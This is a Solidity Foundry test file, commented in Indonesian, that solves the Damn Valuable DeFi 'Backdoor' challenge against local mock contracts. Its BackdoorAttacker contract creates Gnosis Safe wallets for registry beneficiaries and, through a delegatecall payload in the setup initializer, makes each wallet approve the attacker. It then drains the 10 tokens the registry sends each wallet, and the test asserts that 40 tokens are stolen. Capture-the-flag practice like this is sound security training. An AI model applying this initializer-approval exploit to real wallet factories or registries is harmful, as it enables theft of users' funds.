// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/DamnValuableToken.sol";

// --- 1. DEFINISI INTERFACE (REMOTE CONTROL) ---

// INI YANG TADI KURANG: Kita definisikan tombol-tombol remote-nya
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IGnosisSafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (address proxy);
}

// Mock Registry (Target)
interface IWalletRegistry {
    function addBeneficiary(address beneficiary) external;
}

// --- 2. ATTACK CONTRACT (THE TROJAN HORSE) ---

contract BackdoorAttacker {
    address public owner;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token
    ) {
        owner = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;
    }

    // Fungsi jahat yang akan di-delegatecall oleh Gnosis Safe korban
    function approveAttack(address _token, address _spender) external {
        // Karena delegatecall, msg.sender di sini adalah Gnosis Safe-nya factory, 
        // tapi storage context-nya adalah Safe yang baru dibuat.
        // Kita pakai Remote IERC20 untuk menyetujui spender.
        IERC20(_token).approve(_spender, 10 ether);
    }

    function attack(address[] memory beneficiaries) external {
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];

            // 1. Siapkan Payload: Panggil approveAttack saat setup
            bytes memory setupData = abi.encodeWithSelector(
                IGnosisSafe.setup.selector,
                owners,           
                1,                
                address(this),    // TO: Kontrak BackdoorAttacker
                abi.encodeWithSelector(this.approveAttack.selector, token, address(this)), // DATA
                address(0),
                address(0),
                0,
                address(0)
            );

            // 2. Buat Proxy
            // Kita simpan alamat proxy barunya ke variabel newProxy
            address newProxy = IGnosisSafeProxyFactory(factory).createProxyWithCallback(
                masterCopy,
                setupData,
                i,
                walletRegistry
            );

            // 3. Tarik token
            // Karena kita sudah di-approve di langkah 1 (saat setup berjalan),
            // Kita bisa langsung transferFrom dari dompet korban (newProxy) ke kita (owner).
            IERC20(token).transferFrom(newProxy, owner, 10 ether);
        }
    }
}

// --- 3. TEST SCRIPT ---

contract BackdoorChallenge is Test {
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;
    address[] internal users;
    address internal attacker;
    
    DamnValuableToken token;
    address gnosisSafeFactory;
    address gnosisSafeMasterCopy;
    address walletRegistry;
    
    function setUp() public {
        attacker = address(0xBAD);
        alice = address(0x1);
        bob = address(0x2);
        charlie = address(0x3);
        david = address(0x4);
        users = [alice, bob, charlie, david];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");
        vm.label(attacker, "Attacker");

        // Deploy System
        token = new DamnValuableToken();
        gnosisSafeMasterCopy = address(new GnosisSafeMock());
        gnosisSafeFactory = address(new GnosisSafeProxyFactoryMock());

        walletRegistry = address(new WalletRegistryMock(
            gnosisSafeMasterCopy,
            gnosisSafeFactory,
            address(token),
            users
        ));

        token.transfer(walletRegistry, 40 ether);
    }

    function test_Backdoor_Attack() public {
        vm.startPrank(attacker);
        
        console.log("Saldo Awal Attacker:", token.balanceOf(attacker));

        BackdoorAttacker exploit = new BackdoorAttacker(
            attacker,
            gnosisSafeFactory,
            gnosisSafeMasterCopy,
            walletRegistry,
            address(token)
        );

        exploit.attack(users);

        vm.stopPrank();

        console.log("Saldo Akhir Attacker:", token.balanceOf(attacker));

        assertEq(token.balanceOf(attacker), 40 ether, "Attacker should have stolen 40 DVT");
        assertEq(token.balanceOf(walletRegistry), 0, "Registry should be empty");
    }
}

// --- MOCK CONTRACTS ---

contract GnosisSafeMock {
    function setup(
        address[] calldata,
        uint256,
        address to,
        bytes calldata data,
        address,
        address,
        uint256,
        address payable
    ) external {
        if (to != address(0)) {
            (bool success, ) = to.delegatecall(data);
            require(success, "Delegatecall failed");
        }
    }
}

contract GnosisSafeProxyFactoryMock {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (address proxy) {
        GnosisSafeMock newProxy = new GnosisSafeMock();
        proxy = address(newProxy);
        
        // Execute setup on proxy
        (bool s, ) = proxy.call(initializer);
        require(s, "Setup failed");

        if (callback != address(0)) {
            WalletRegistryMock(callback).proxyCreated(proxy, _singleton, initializer, saltNonce);
        }
    }
}

contract WalletRegistryMock {
    address public masterCopy;
    address public walletFactory;
    IERC20 public token; // Disini kita pakai IERC20 juga

    constructor(
        address _masterCopy,
        address _walletFactory,
        address _token,
        address[] memory
    ) {
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        token = IERC20(_token);
    }

    function proxyCreated(
        address proxy,
        address,
        bytes calldata,
        uint256
    ) external {
        // Logic mock: langsung transfer kalau dipanggil factory
        require(token.balanceOf(address(this)) >= 10 ether, "Not enough funds");
        token.transfer(proxy, 10 ether);
    }
}